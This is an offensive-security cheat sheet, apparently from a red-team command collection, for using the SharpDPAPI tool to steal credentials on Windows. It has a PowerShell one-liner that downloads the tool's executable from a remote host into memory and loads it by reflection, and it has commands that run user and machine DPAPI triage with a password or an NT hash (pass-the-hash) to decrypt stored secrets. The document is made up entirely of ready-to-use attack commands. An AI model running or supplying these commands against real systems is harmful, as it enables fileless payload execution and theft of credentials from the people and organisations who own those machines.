# SharpDPAPI

% SharpDPAPI, dpapi
#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/DPAPI 

## bin - download into memory
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/windows/NetFramework_4.7_x64/SharpDPAPI.exe'); $asm = [System.Reflection.Assembly]::Load($data); 
```
## assembly reflection - cmd
```powershell
$params="<cmd>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```

## ps1 - cmd
```powershell
Invoke-SharpDPAPI "<cmd>"
```

## bin - user triage (creds)
```powershell
SharpDPAPI.exe triage /password:<password>
```

## bin - user triage (pth)
```powershell
SharpDPAPI.exe triage /ntlm:<nt_hash>
```

## bin - machine triage (creds)
```powershell
SharpDPAPI.exe machinetriage /password:<password>
```

## bin - machine triage (pth)
```powershell
SharpDPAPI.exe machinetriage /ntlm:<nt_hash>
```

